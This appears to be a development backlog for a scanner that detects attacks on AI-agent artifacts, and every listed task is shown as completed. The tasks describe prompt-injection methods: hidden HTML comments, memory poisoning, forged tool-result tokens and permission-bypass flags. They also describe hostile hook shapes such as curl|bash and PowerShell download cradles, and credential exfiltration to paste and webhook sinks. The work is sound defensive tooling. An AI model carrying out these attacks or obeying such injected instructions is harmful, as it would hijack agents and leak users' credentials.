# Build-Loop Task Backlog (50 tasks)

Consumed by the autonomous `shellockolm-build-loop` scheduled task. Rules:

- Work **top-down within the highest unfinished tier**; one task per run.
- Mark a task done by checking it off and appending the commit hash.
- Every scanner/detection task ships with fixtures + tests (positive cases AND a
  benign zero-false-positive baseline). Every CLI/MCP task ships with a test or a
  recorded verification command. Website tasks must pass `npm run build`.
- Guardrails from the scheduled task always apply (no deploys, no Stripe, no main).

Status legend: `[ ]` open · `[x] (hash)` done · `[~]` blocked (note why).

---

## Tier 1 — Detection engine depth (the product IS the detections)

1. [x] **AGENT-PI-011: Homoglyph/confusable spoofing** — detect mixed-script confusables (Cyrillic а/е/о inside ASCII words) in skill/instruction files used to evade keyword review. Use a small confusable map, not a full UTS#39 table. _(commit 99aa1f1)_
2. [x] **AGENT-PI-012: Markdown link/text mismatch** — link text says one domain, href is another (`[github.com/x](https://evil.tld)`) in agent artifacts; classic lure for agent auto-fetch. _(commit c2a6c57)_
3. [x] **AGENT-PI-013: HTML-comment-hidden instructions** — imperative instructions hidden inside `<!-- ... -->` blocks in skills/instruction files (invisible in rendered view, read by model). Flags a comment only when its body carries a directive cue (override/jailbreak, AI-addressed command, "note to the AI", covert "don't tell the user", exfil/execute, "from now on"); descriptive/tooling comments never trip it. Verified zero FP across 1344 real skill/instruction files. _(commit 35aecaf)_
4. [x] **AGENT-PI-014: Frontmatter abuse in SKILL.md** — structurally parses the leading YAML frontmatter and flags permission/safety-bypass flags baked into it: `bypassPermissions`, `--dangerously-skip-permissions` (anywhere in the block, incl. args lists), truthy safety toggles (`auto-approve`/`yolo`/`disable-safety`/`skip-permissions`/`no-confirm`…), and `permission-mode: bypassPermissions`-style modes. Structured parse means a `description` that only *mentions* a flag never trips it. Wildcard `allowed-tools: "*"` was deliberately NOT flagged — calibration showed it's used legitimately by tool-adaptive skills (the `model:` key likewise is legitimate and not flagged). Verified zero FP across 2728 real skill/instruction files via the live scanner. _(commit 6f4e4e3)_
5. [x] **AGENT-PI-015: Memory/persistence poisoning** — flags self-propagating injection: an artifact instructing the agent to write a directive into its own persistent standing-context store (CLAUDE.md / AGENTS.md / a memory file / .cursorrules / settings.json / "your memory/config") so it auto-loads every future session — a one-shot inject rewritten into config to become a persistent backdoor. Fires only when a "persist <self-reference> into <memory/config target>" action co-occurs (within a ~420-char window) with a self-propagation payload cue (covert "don't tell the user", an instruction override, or a "from now on always…" coercion); a notes/memory skill that merely saves user-chosen facts carries no such cue and is not flagged. Verified zero FP across ~3017 real skill/instruction artifacts via the live Pro scanner. _(commit 365fe17)_
6. [x] **AGENT-MCP-004: Suspicious env exfil in MCP config** — structurally inspects each MCP server's `env` block and flags a broad ambient host credential (AWS_ACCESS_KEY_ID/SECRET/SESSION, GITHUB/GH_TOKEN + PAT, GITLAB token, SSH_AUTH_SOCK/SSH_PRIVATE_KEY, GOOGLE_APPLICATION_CREDENTIALS/GCP/GCLOUD creds, AZURE client secret, KUBECONFIG, NPM/NODE_AUTH token, DOCKER password, CLOUDFLARE/DO/VERCEL/NETLIFY/HEROKU/HF tokens) forwarded to a server whose name/command/args/package does not relate to that credential's service. Identifies the credential by the env KEY *or* by a `${VAR}`/`$VAR`/`${env:VAR}` interpolation in the value (catches a cred renamed to an innocuous key), and uses delimited-token service association so the official integration (aws-* server ← AWS creds, github server ← GITHUB_TOKEN) is never flagged. Non-secret config (AWS_REGION, NODE_ENV) and app-scoped keys (BRAVE_API_KEY) are not in the credential map. Verified zero FP across 94 real MCP configs (27 with env blocks; correctly suppressed a real github-server ← GITHUB_TOKEN case) via the live Pro scanner; 7 new tests (3 positive incl. renamed-via-value + KUBECONFIG in desktop config, 4 benign baselines). _(commit b25a8cc)_
7. [x] **AGENT-MCP-005: MCP server from raw URL / gist** — structurally inspects each MCP server's launch path (command + args, not the env block and not a remote server's `url` transport field) and flags a URL whose host is a dedicated raw-code / paste / gist service (raw.githubusercontent.com, gist.githubusercontent.com/gist.github.com, raw/rawcdn.githack.com, pastebin.com, paste.ee, hastebin, dpaste, rentry, 0bin, ghostbin, controlc, bpa.st, ix.io, sprunge.us, paste.rs, termbin) OR a routable **public** IP literal. The code that runs is then fetched unversioned and attacker-mutable at launch (`deno run <url>`, `npx <tarball-url>`, `bunx <url>`, `uvx --from git+<rawhost>`) — a supply-chain RCE / rug-pull channel distinct from the curl|bash pipe form (AGENT-MCP-001). Public-IP detection uses `ipaddress.is_global`, so loopback / private (RFC1918) / link-local / CGNAT / documentation IPs (local dev) are excluded; the host suffix match is `.`-anchored so a lookalike (`raw.githubusercontent.com.evil.com`) is never mistaken for the trusted host; and an ordinary vendor endpoint (`https://api.vendor.com/mcp` passed to a proxy) is never flagged. Verified ZERO FP across 100 real MCP configs (190 servers; the 2 URL-bearing servers — a 127.0.0.1 loopback and a *.netlify.app vendor endpoint — correctly passed) via the live Pro scanner; 9 new tests (5 positive incl. git+https raw + public-IP literal, 4 benign baselines). _(commit 060021c)_
8. [x] **AGENT-N8N-002: n8n credential-node exfil pairing** — structurally parses the exported workflow's node list and fires on a tight credential-exfil pairing, not on mere co-occurrence (almost every real workflow uses credentials AND calls external APIs). Two zero-FP conditions: **(A) PAIRING** — a credential read (a node's `credentials` binding, or params referencing `$credentials` / `getCredentials(` / `$secrets.` / a secret-named `$env` var / a hardcoded key) co-occurs with a POST to a known out-of-band / request-capture / paste sink (webhook.site, `*.ngrok.*`, `*.oast.*`, interact.sh, burpcollaborator, dnslog, `*.requestcatcher.com`, pastebin/hastebin/paste.ee); Slack/Discord **incoming webhooks** and pipedream are deliberately excluded as legitimate notification destinations. **(B) DIRECT EMBED** — a single node ships a hardcoded high-entropy key literal (AKIA…/ghp_…/sk-…/AIza…/xox…) to a routable external host in the request itself (new coverage beyond the env-ref-only AGENT-EXFIL-003); loopback/private/`.local` destinations are excluded via `ipaddress.is_global`. Verified ZERO FP across a 15-workflow benign corpus (Stripe/GitHub/OpenAI/SendGrid/Airtable/Notion/HubSpot/Sheets credentialed API calls, DB-read + Slack & Discord incoming webhooks, pipedream, secret-named `$env` to a real API, non-secret `$env` in URL, code transforms, webhook trigger/respond) while catching all 4 malicious shapes; 8 new tests (4 positive incl. direct-embed + env-secret/oast, 4 benign baselines). _(commit 49f3060)_
9. [x] **AGENT-PI-016: Cross-file staged payload** — flags an artifact that sends the agent to a companion file and tells it to FOLLOW/OBEY the instructions inside (an obey-verb + instruction-noun pointing into the file, a bare obey-pronoun right after a read of it — "read … and follow it" — or "do what it says"). Calibration on the real corpus found the plain in-bundle form ("read forms.md and follow its instructions") is the OFFICIAL skill progressive-disclosure pattern (Anthropic's pdf / skill-creator skills), so a GATE limits firing to the exploitable subset: a SUSPICIOUS target path (parent traversal `../`, absolute / home `~` / UNC, or a hidden dot-directory) OR a covert/instruction-override cue framing the indirection (reuses the PI-015 payload cue). Data reads ("parse the apiUrl"), doc pointers ("see ./docs/setup.md for the steps"), "run it" on a script, "follow the steps below", and a suspicious path read for *data* (no obey cue) are all not flagged. Verified ZERO FP end-to-end through the live Pro scanner across 2962 skills + 62 instruction files (the 6 prior progressive-disclosure hits are now correctly suppressed); 12 new tests (7 positive incl. traversal/hidden/absolute/UNC + covert/override framing, 5 benign baselines incl. the official in-bundle pattern). _(commit 5e6cfd8)_
10. [x] **Hook/command scanning** — extends the agent scanner to two new artifact classes. **(A) `.claude/settings.json` / `settings.local.json` `hooks`** — shell commands the agent auto-runs on lifecycle events with no per-invocation prompt (a zero-click RCE/exfil channel in a cloned repo). Hook commands are extracted STRUCTURALLY (only string values under a `command` key, so `matcher`/`type`/event metadata is never misread) and only unambiguously dangerous shapes fire — never a plain prettier/eslint/pytest/git hook: `AGENT-HOOK-001` (CRITICAL) download-and-execute (curl|bash, PowerShell Net.WebClient/DownloadString+iex cradle, certutil/bitsadmin LOLBIN), `AGENT-HOOK-002` (HIGH) obfuscated exec (encoded PowerShell `-enc`/`-ec`, base64-decode|shell, atob/FromBase64String→eval), `AGENT-HOOK-003` (HIGH) out-of-band exfil (webhook.site/`*.ngrok.*`/`*.oast.*`/interact.sh/pastebin), plus reused `AGENT-DESTRUCT-001` for auto-running destructive hooks. Scoped to files inside a `.claude` tree so `.vscode/settings.json` etc. are ignored. **(B) `.claude/commands/**/*.md` slash commands** — a command body becomes a prompt the agent runs, so it gets the full high-precision structural/stealth suite + unambiguous malicious-content rules, but EXCLUDES the broad NL heuristics (PI-002/PI-006/PRO-001/PRO-002/DESTRUCT) that legit command prose trips. Skills/instructions/commands now share one `_scan_text_artifact` path. Verified ZERO FP across 916 real marketplace command files (incl. official Anthropic commands) + 35 real `.claude` settings files via the live Pro scanner; 36 new tests (positive hook/command shapes, structural-extraction, `.claude`-scoping, benign baselines for every calibrated-out case), full suite 185 green. _(commit ff78be7)_
11. [x] **AGENT-SECRET-002: broaden secret patterns** — new high-value credential rule covering Stripe live/restricted keys (`sk_live_`/`rk_live_`), Telegram bot tokens (`<id>:AA…`), and Discord bot tokens (`M|N|O…` three-segment), plus a Supabase **service_role** JWT detector that decodes the payload and flags ONLY the RLS-bypassing key — the publishable **anon** key has the same shape and is correctly suppressed. OpenAI `sk-` stays covered by AGENT-SECRET-001. Crucially adds **redaction**: `AgentRule` gains a `secret` flag and matched credentials are now masked via `_mask_secret` (type prefix + length only) across the prose, MCP-structured, and n8n direct-embed paths, so findings — and any CI log / SARIF built from them — never re-emit a live secret. Verified ZERO FP across 2,761 real skill/instruction/MCP artifacts via the live scanner; 18 new tests (positive Stripe/Telegram/Discord/service_role cases, anon-JWT anti-FP, MCP-env coverage, redaction assertions, benign baseline), full suite 202 green. _(commit ca44ed0)_
12. [x] **Severity-context boost** — composite scoring in the finalize pass: a PI finding co-located with a data-exfiltration sink in the SAME artifact is raised one severity notch (capped at CRITICAL), annotated (`original_severity`/`severity_boosted`/`composite_exfil_sink`) with a +0.5 cvss nudge. Zero NEW false positives by construction — it only re-weights findings whose two constituent (already zero-FP) rules both fired, never lowers severity, and groups per-artifact so it never crosses files. Sink set is the high-precision attacker-egress rules (EXFIL-002 secret-in-URL, EXFIL-003 paste/webhook/OOB, PRO-003 context-exfil, structured MCP-004/N8N-002/HOOK-003); **AGENT-EXFIL-001 deliberately excluded** because its pattern is also the shape of an authenticated API call (`curl -H "Authorization: Bearer $API_KEY"`) — calibration over ~2,700 real skills showed including it amplified benign skills (varlock, whatsapp-cloud-api), and excluding it yields ZERO composite escalations on that corpus. 9 new tests, full suite 210 green. _(commit 1ee644d)_
13. [x] **AGENT-PI-017: Tool-output injection markers** — flags a model-facing artifact (skill/instruction/command) that embeds a RAW harness framing token: a `<system-reminder>` block, the tool-use framing (`<function_calls>` / `<invoke name="…">` / `<function_results>`), or the `<tool_use>` / `<tool_result>` content-block tags. The agent runtime uses these to wrap higher-trust content it injects itself, so an artifact that emits one spoofs that boundary — fabricating a "system reminder" the model obeys, forging a tool RESULT ("the scan passed", "the command succeeded") to mislead the agent, or forging a tool CALL to steer its next action. Distinct from AGENT-PI-009 (forged chat-template ROLE tokens). High precision: HTML-escaped forms can't match (no literal `<`); inline-backtick and fenced-code references are suppressed so a skill that *documents* the format is never flagged; and the `tool_*` family requires a `_`/`-` separator so camelCase identifiers (Rust `Vec<ToolCall>`, JSX `<ToolResult/>`) never match. Runs on all prose artifacts and auto-participates in the composite severity boost. Verified ZERO FP across 8,909 real skill/instruction/command files via the live scanner — the one raw hit was a genuine true positive (a leaked `<function_calls><invoke name="TodoWrite">` transcript embedded in a published command template); 12 new tests (8 positive incl. command-file + line-number, 4 benign baselines), full suite 225 green. _(commit 1fc7cee)_
14. [x] **Allowlist/ignore support for agent-scan** — respect `.shellockolmignore` rule IDs per path so teams can suppress accepted findings (reuse ignore_handler). A `.shellockolmignore` line whose first whitespace-delimited token is an uppercase, hyphen-segmented rule ID (`AGENT-PI-013`, a comma-list `AGENT-PI-013,AGENT-MCP-004`, with an optional trailing gitignore-style path glob) is parsed as a finding suppression instead of a path pattern; the `_RULE_ID_RE` requires all-uppercase segments so ordinary lowercase path patterns (`node_modules/`, `*.min.js`, `important-notes`, `MY-DIR/`) are never misread as rule IDs — existing path-only ignore files are untouched. `IgnoreFile` gained `rule_suppressions` + `rule_should_ignore(rule_id, path)` (path matched relative to the ignore file's dir); `IgnoreHandler.is_rule_suppressed()` honors global + project files (most specific first) and `get_stats()` reports a `rule_suppressions` count. The agent scanner's `scan_directory` runs `_apply_rule_suppressions()` after composite scoring — discovering ignore files in the scanned tree plus `~/.shellockolmignore`, dropping findings whose rule ID is suppressed for their `_artifact_key` path, and recording `findings_suppressed` in stats (fully guarded; no-ops and never raises with no suppressions). The CLI prints a non-silent "N finding(s) suppressed by .shellockolmignore rule allowlist" line; README + the generated ignore template document the syntax. Verified on the live Pro scanner over the real ~/.claude/skills corpus (1344 skills, 187 findings): no ignore file → `findings_suppressed=0`, results unchanged; suppressing AGENT-PI-012 removed exactly its 13 hits (187→174) while AGENT-PI-002's 85 hits stayed (no over-suppression). 12 new tests (8 ignore-handler unit + 4 scanner e2e incl. path-scoping + unrelated-rule no-suppression baseline), full suite 237 green. _(commit a54bb1e)_
15. [x] **Confidence field on findings** — adds a `confidence` (high|medium|low) axis distinct from severity: `high` = a structural / signature / decoded-secret match (deterministic true positive — every inline stealth-channel check, the credential-egress sinks, MCP/n8n/hook structured rules, PI-003/004/008/009), `medium` = a natural-language phrasing heuristic that matches the real attack shape but can fire on benign prose (PI-001 override, PI-006 covert, PRO-001 fetch-then-follow, PRO-002 shadowing, EXFIL-001 cred-to-network — the authenticated-API shape, DESTRUCT-001 documented examples, MCP-002/003 config keywords), `low` = the broadest "when the user does X" conditional (PI-002). `confidence` lives on `AgentRule` (default high; only broad-NL constants downgrade) and `ScanFinding` (default high, so deterministic CVE/secret findings are never filtered), propagated through `_mk`. `scan_directory(min_confidence=…)` drops sub-threshold findings after composite+suppression and records `findings_below_confidence` + `min_confidence` in stats; the CLI gains `--min-confidence low|medium|high` (passed only to scanners that declare it, like quick_mode), surfaces the hidden count non-silently, shows confidence inline for any non-high finding, and includes it in the `-o` JSON + `ScanResult.to_dict`. Verified on the live corpus of 1334 real skills: default `low` = 187 findings (byte-identical to pre-change), `medium` = 102 (drops the 85 broad PI-002 hits), `high` = 42 (only structural/signature/secret) — a high-signal CI gate, with the benign baseline staying zero-FP at every threshold. 11 new tests (per-tier confidence assertions, threshold filtering, unknown-value safety, no-new-FP, valid-confidence guard over all rules, helper ordering, ScanFinding default), full suite 248 green. _(commit a7c008d)_

## Tier 2 — CLI tool experience

16. [x] **`shellockolm agent-scan --json`** — `scan --json` CI mode emits ONE stable JSON document to stdout and suppresses all human/rich output (banner, progress, findings, panels, summary; errors routed to stderr) so it pipes straight into `jq`; exit code stays 1 on findings / 0 when clean. The document is a documented contract (`schema_version` 1.0) assembled by a new pure `build_json_report()` helper — top-level `tool`/`scan`/`summary`/`findings`/`errors`, findings sorted CRITICAL→INFO, a `by_severity` tally, and the `findings_suppressed`/`findings_below_confidence` counts surfaced; each finding exposes a stable `id` (CVE id or AGENT-* rule id), severity, confidence, scanner, file_path, cvss_score and remediation. `ensure_ascii` keeps the stream pipe-safe even when a decoded injection payload carries invisible Unicode; `-o file` alongside `--json` persists the identical document. README documents the flag + full schema and the CI/CD snippet now uses it. Verified with 12 new tests (8 unit on `build_json_report` — schema keys, version, severity tally, ordering, empty/clean, suppressed+below-conf propagation, ascii-safety; 4 end-to-end subprocess tests over malicious+benign skill fixtures — pure-JSON stdout with no banner leakage, exit 1 vs 0, `-o` file mirroring); full suite 260 green (was 248); human path unchanged. _(commit e81c97d)_
17. [x] **SARIF output for agent-scan** — `scan --sarif <path>` writes a SARIF 2.1.0 document covering every finding (dependency CVEs, secrets, malware, AND the agent `AGENT-*` supply-chain rules) so GitHub Code Scanning / the VS Code SARIF viewer surface agent-scan findings inline. A unified `SarifGenerator.add_scan_finding`/`from_scan_findings` path turns each `ScanFinding` into a SARIF rule + result with per-family metadata: `AGENT-*` rules point at the repo (NOT NVD) and are tagged `agent`/`supply-chain` plus the attack class (`prompt-injection`/`mcp`/`n8n`/`hooks`/`secrets`/`exfiltration`/`destructive`), `CVE-*` point at NVD, severity maps to `error`/`warning`/`note` and carries the `security-severity` 0–10 score GitHub reads. `_split_location` resolves the agent `<path>:<line>` and structured `<path> » server:<name>` location labels into a bare artifact path + `startLine` (Windows drive colon preserved via an end-anchored regex); `_uri` emits best-effort repo-relative, forward-slashed URIs for GitHub ingestion. `SarifResult` gained an optional `properties` field surfacing detection `confidence` (existing results serialize byte-identically when unset). The pure `cli.build_sarif_report` assembler (mirrors `build_json_report`) clears the pre-seeded builtin rule catalog so a clean/agent-only report defines ONLY rules that fired. The `--sarif` write is a file artifact independent of the stdout mode — it composes with both the human and `--json` paths and never writes to stdout. Secrets are already redacted in finding text, so the SARIF never re-emits a live credential (asserted). Verified with 27 new tests (document shape, per-family rule metadata, severity→level map, line/URI extraction incl. structured-suffix + drive-colon + relativization, confidence property, redaction, e2e malicious/benign/`--json`-compose); full suite 287 green (was 260). Real-world run over a malicious skill + raw-URL MCP config emitted valid SARIF with only the 2 fired rules and correct per-finding locations. _(commit 208a5ca)_
18. [x] **Exit-code contract** — `scan` now has a documented, stable exit-code contract: **0** clean (no findings, or none at/above the gate), **1** findings gate the build, **2** usage/operational error. A new `--fail-on critical|high|medium|low|info` gates the build on severity (exit 1 only when a finding at or **above** that level is present — `--fail-on high` fails on HIGH/CRITICAL, passes on MEDIUM/LOW), with `--fail-on none` for report-only runs; with no flag, any finding still exits 1 (legacy behavior preserved). A finding present but below the gate is announced, never silently passed. Crucially, usage/operational errors (bad path, unknown scanner, unknown `--min-confidence`, unknown `--fail-on` value) now exit **2** instead of **1**, so a flag typo can't masquerade as a clean run. Gate logic is a pure `_findings_gate_failure()` helper shared by the human and `--json` paths; severities use the existing `_SEVERITY_ORDER` ranking. Documented in the README (exit-code table + `--fail-on` examples) and CHANGELOG. 18 new tests (8 unit on the gate across every fail-on/severity combination incl. report-only aliases + case-insensitivity, 10 e2e subprocess asserting real process exit codes for each gate setting and each error path); full suite 305 green (was 287). _(commit 6e6a0b0)_
19. [x] **`--diff` mode** — restricts reported findings to files changed in git, for fast pre-commit / PR-scoped CI. `--diff` scans the **staged** set (`git diff --cached` — the exact content a commit introduces); `--diff-ref <ref>` scans everything that differs from a ref (working tree vs `<ref>`, e.g. origin/main), and implies `--diff`. New `src/diff_scan.py` separates the git call (`resolve_changed_files`; raises `DiffScanError` → CLI exit **2** on not-a-repo / missing git / unknown ref) from the pure, exhaustively-tested path-matching (`path_matches_changed` / `filter_results_to_changed`): it strips a finding's `:<line>` and ` » server:<name>` suffix, resolves relative paths against the scan cwd, and compares **normalized + case-folded** keys — exact, never a fuzzy basename match (two `SKILL.md` in different dirs stay distinct); refs pass as their own argv token with a leading-dash guard (no `--option` injection). Filtering runs after the scan and before all rendering, so `--json`/`--sarif`/human paths are uniformly diff-scoped; the drop count is announced (never silent) and surfaced as `summary.findings_diff_filtered` in `--json`. An **empty** changed set short-circuits the scanner walk and exits **0** (the real pre-commit fast path). Composes with `--fail-on`/`--min-confidence`. Verified live (a staged benign skill hides an unchanged malicious one — SECURE + "1 finding hidden" — while the full scan still flags it). 28 new tests (`tests/test_diff_scan.py`: pure-matching units, real-temp-repo integration for staged/ref/not-a-repo using `GIT_CEILING_DIRECTORIES` isolation, e2e proving unchanged-malicious-hidden vs staged-malicious-reported + exit-2 not-a-repo); full suite **333 green** (was 305). _(commit 011e0ad)_
20. [x] **Pre-commit hook integration** — ships `.pre-commit-hooks.yaml` with two hooks consumers add in one `.pre-commit-config.yaml` block: **`shellockolm-agent`** (the recommended default — `scan --diff -s agent --fail-on high`, with a `files:` regex so it triggers ONLY when a `SKILL.md`/`mcp.json`/`.claude/`/`CLAUDE.md`/`AGENTS.md`/`GEMINI.md`/`.cursorrules`/copilot-instructions artifact is staged) and **`shellockolm`** (full deps+secrets+malware+agent `scan --diff`). Both are `language: python` (pre-commit builds an isolated venv and `pip install`s the repo, exposing the `shellockolm` console script), `pass_filenames: false` (the `scan` CLI takes ONE positional PATH, not a filename list — `--diff` does the scoping by reading `git diff --cached` itself), and `require_serial: true`. `--diff` is baked into `entry` (not `args`) so a consumer's `args:` gate override (e.g. `--fail-on critical`) can never accidentally widen the scan to the whole tree; the empty-staged-set fast path exits `0` instantly. Documented in the README (config block + `args:` tuning) and CHANGELOG. Verified: the exact hook entry argv `scan --diff -s agent --fail-on high .` runs clean (exit 0) on the live repo, and an 11-test contract suite (`tests/test_pre_commit_hooks.py`) asserts the YAML shape, that each `entry` console script is declared in `pyproject` `[project.scripts]`, that every default `--fail-on` value is in the CLI's `_FAIL_ON_CHOICES`, and that the agent `files` regex matches 13 real agent-artifact paths while rejecting ordinary source files (`src/app.js`, `README.md`, `package.json`, `docs/skill-guide.md`). Full suite 344 green (was 333). _(commit 2416302)_
21. [x] **GitHub Action** — replaces the broken stub `action.yml` with a real composite action: checkout (by the caller) → scan → SARIF upload. Runs the scan in stable `--json` mode writing both a JSON report (`-o`) and a SARIF 2.1.0 document (`--sarif`), then uploads the SARIF to GitHub code scanning via `github/codeql-action/upload-sarif` (gated on an `upload-sarif` input + a `hashFiles` existence check). **Fixed two real bugs in the prior stub:** it defaulted `scanner` to `all` and passed `-s all`, which `scan` rejects (exit 2 → failed *every* run — `all` is the `live` command's default, not `scan`'s), and its `fail-on` input was declared but never wired. Now `scanner` defaults to empty (= run every scanner) with `-s` passed only when a scanner is named, `--fail-on` is threaded to the documented exit-code contract and re-raised so the build actually gates, and the `findings`/`report`/`sarif`/`exit-code` step outputs are populated (the count comes from a dependency-free `scripts/action_summary.py` that prints only the integer to stdout and a readable per-finding breakdown to stderr/the Actions log, degrading to `0` on a missing report). README CI/CD section documents the `uses:` snippet incl. the required `security-events: write` permission; CHANGELOG updated. Verified end-to-end by replaying the action's exact argv: malicious skill + `--fail-on high` → exit 1 (findings=1); benign skill → exit 0 (findings=0); malicious + `--fail-on none` → exit 0 report-only (findings=1); bad `--fail-on` → exit 2; SARIF emitted as valid JSON. 20 new contract tests (`tests/test_github_action.py`: composite-action shape, input/output/default validation incl. the `-s all` regression guard + `--fail-on`∈`_FAIL_ON_CHOICES`, scan-step flag wiring, SARIF-upload step, and the helper's stdout-count/stderr-render/missing-report behavior); full suite 364 green (was 344). _(commit 63219e9)_
22. [x] **Rich/terminal table output polish** — `scan --table` renders findings as a polished table **grouped by file** (one compact Rich table per artifact: severity-colored rows with rule ID / line / CVSS / confidence) closed by a severity-tally summary footer. **Degrades gracefully when stdout is not a TTY** — a piped/redirected stream gets an ASCII box (no Unicode frame glyphs), no ANSI color, and the bare severity word instead of an emoji glyph. Grouping reuses `diff_scan.bare_path`, so a file's findings collapse together across the `:<line>` and `» server:<name>` location suffixes; `--json` (CI mode) suppresses the table so stdout stays a single JSON document. Rendering helpers (`group_findings_by_file`, `build_findings_table`, `build_severity_footer`, `render_findings_table`) are pure/testable, and all finding text is wrapped in `rich.text.Text` so a bracket in a path/title can't be mis-parsed as console markup. 19 new tests (`tests/test_cli_table_output.py`: grouping/ordering units, TTY-vs-non-TTY degradation, tallies, markup-safety, e2e subprocess proving the table renders + the piped stream is ASCII + `--json` still emits only JSON); full suite 383 green (was 364). _(commit f02b0b3)_
23. [x] **`shellockolm rules list`** — a `rules` command group whose `list` subcommand prints the full agent supply-chain rule catalog: each rule's ID, severity, **tier** (free/Pro), confidence, attack class, and one-line description. Filters `--tier free|pro` and `--severity critical|…|info`; `--json` emits ONE stable JSON document (`schema_version` 1.0, ordered by id) that doubles as docs and feeds RULES.md / CI — pure JSON on stdout, usage errors to stderr with exit `2` on an unknown filter value (per the scan exit-code contract). Backed by a single canonical catalog in `scanners/agent_supply_chain.py` (`agent_rule_catalog()` / `ALL_AGENT_RULES`, with `agent_rule_tier`/`agent_rule_class` helpers): the 11 structural / stealth-channel rules that were inline `AgentRule` literals (PI-005/007/010-017, OBF-002) were promoted to named module constants so every rule — including the pattern-less structural ones — is enumerable WITHOUT running a scan. Behaviour-preserving refactor: the full pre-existing 198-test agent suite stays green, and a dedicated test asserts a promoted rule still emits its exact catalog metadata. 22 new tests (`tests/test_rules_catalog.py`: catalog completeness incl. all structural rules, tier/attack-class classification, de-dup + ordering, valid enums, behaviour preservation, e2e `rules list` JSON/filters/exit-2/human-table); full suite 405 green (was 383). _(commit f3888c6)_
24. [x] **`--explain RULE-ID`** — shipped as `shellockolm rules explain <RULE-ID>` (the idiomatic Typer sibling of `rules list`, vs. a bare flag). Prints one rule's severity/tier/confidence/attack-class/CVSS, then the full description, a concrete **example attack**, and the remediation. Rule ID is case-insensitive; unknown ID is a usage error → exit `2` (message to stderr so `--json` stdout stays empty); `--json` emits one stable `schema_version` 1.0 doc with a `rule` object. Backed by a canonical per-rule example-attack catalog (`_RULE_ATTACK_EXAMPLES` + `agent_rule_example()`/`agent_rule_explain()` in `scanners/agent_supply_chain.py`) with a test-enforced example for **every** rule (no drift), non-live placeholder credentials, and console-markup escaping so a markdown-link example (`[docs.github.com](…)`) can't break the render. 11 new tests (catalog completeness, case-insensitive/unknown-safe lookup, explainer↔catalog parity, every-rule coverage, e2e human/`--json`/case-insensitive/exit-2/markup-safety); full suite 416 green (was 405). _(commit 3011296)_
25. [x] **Baseline file support** — two modes let CI fail **only on NEW findings**: `scan --write-baseline baseline.json` snapshots every current finding into a committed file (a report-only run that never fails the build), and `scan --baseline baseline.json` drops every finding already in the baseline so only NEW ones are reported and gate the exit code (composes with `--fail-on`). A finding's identity is a SHA-256 over `id | repo-relative path | package | version`, deliberately EXCLUDING the line number (a line shift from an unrelated edit must not make a known finding look new and spuriously fail the build) and severity (a later composite-severity boost is still the same finding). The path is stored repo-relative, forward-slashed and case-folded, so a baseline written on one machine matches a scan on another. Hidden count is announced (never silent) and surfaced as `summary.findings_baselined` in `--json`; a missing/corrupt/wrong-shape baseline is a usage error (exit 2, never a silent pass), as is passing both flags. New self-contained `src/baseline.py` mirrors `diff_scan.py` (pure, tested identity + filtering split from file I/O); the baseline file is a documented `schema_version` 1.0 JSON doc (deduped + sorted for clean diffs). Verified end-to-end via the live CLI (write→exit 0 with the finding shown; no-change compare→SECURE + "1 known finding hidden"→exit 0; a NEW skill→exit 1 reporting ONLY the new file; missing baseline→exit 2). 25 new tests (`tests/test_baseline.py`: fingerprint stability across line-shift + severity-change, per-axis distinctness, build/load/filter round-trip, every load error path, e2e subprocess exit codes); full suite 441 green (was 416). _(commit 673b8c7)_
26. [x] **Quick benchmark + perf guard** — new `scripts/benchmark_scan.py` generates a deterministic, self-contained corpus of agent artifacts (skills/MCP/n8n/instruction/`.claude` settings+commands; ≈5% malicious) in a temp dir, scans it, and reports wall-clock + throughput (with a `--budget` exit gate); the corpus generator is shared with `tests/test_perf_guard.py` so the benchmark and the CI tripwire agree. Profiling the benchmark exposed the per-character stealth scans (Unicode-Tags PI-007, bidi, confusable/homoglyph) iterating EVERY char of every artifact (+ for confusables a regex over every word). Since every stealth code point is >U+007F, a single C-level char-class search (`_STEALTH_CHARS_RE`, built FROM the same constants the checks consume so it can't drift) lets a pure-ASCII artifact skip all three Python loops. **1,333 of 1,335 real skills are pure ASCII**, so the fast path applies almost everywhere: **−14.2% wall-clock on the real `~/.claude/skills` corpus (18.65s→16.01s)** and −10.3% on a 2,000-artifact synthetic tree, with findings **byte-identical** both ways (strict superset guard — any real stealth char still runs the full slow-path scan). Real measured numbers recorded in `docs/PERFORMANCE.md` (+ README link); the remaining regex-pass hotspot (`_check_staged_payload`/PI-016) is documented as a follow-up (a whole-text gate doesn't help — `run`/`execute`/`apply` are too common). 15 new tests (anti-drift regex coverage, benign ASCII+non-ASCII fast-path, every-attack detection preserved, throughput tripwire); full suite **456 green** (was 441). _(commit 0f8ed52)_
27. [x] **Windows path/encoding hardening pass** — closes three Windows-specific robustness gaps in the agent scanner. **(A) Encoding evasion + BOM FP** — artifacts were read as UTF-8 with `errors="ignore"`, so a malicious skill saved as **UTF-16** (Notepad "Unicode" save, PowerShell `Out-File`/`>`) decoded to garbled NUL-interleaved text that matched NO rule — a full detection bypass (confirmed 0 findings vs 2 in UTF-8) — while a benign **UTF-8-BOM** file leaked a leading `U+FEFF` that AGENT-PI-005 mis-flagged as an invisible-char smuggle (false positive). New `_decode_bytes` detects the UTF-8/16/32 byte-order mark (longest match first so UTF-32 wins over its UTF-16 prefix), strips it, and decodes with the right codec, with a NUL-density heuristic for BOM-less UTF-16; decoding is always lenient so it can never raise mid-scan. Detections now fire identically across UTF-8 / UTF-16 LE+BE / UTF-32 / BOM, and the BOM FP is eliminated. **(B) Read errors collected, scan continues** — a long-path / locked / reparse / permission read error is now recorded in `result.errors` (capped at `MAX_RECORDED_ERRORS`=50) instead of silently dropped, so a skipped file is visible rather than masquerading as clean. **(C) Reparse-point loop protection** — the directory walk now skips directory symlinks AND Windows **junctions** (`Path.is_symlink()` is False for a junction, so `_is_reparse_point` also checks the lstat `FILE_ATTRIBUTE_REPARSE_POINT`), which could otherwise loop back into the tree and re-report findings (a self-referential junction inflated one skill's findings 5×) or escape the scan root; the `max_depth` cap remains the no-crash backstop and file symlinks are still followed. Verified a **strict no-op on the real `~/.claude/skills` corpus** (187 findings, byte-identical to prior runs; 0 read errors). 28 new tests (`tests/test_windows_hardening.py`: per-BOM decode units + ordering + never-raises, malicious detected in every encoding incl. BOM-less UTF-16, benign zero-FP in every encoding, the AGENT-PI-005 BOM regression guard, read-error collection + cap + path-not-found, and a real junction/symlink self-loop that completes without crashing and counts the finding exactly once); full suite **484 green** (was 456). _(commit c926c99)_
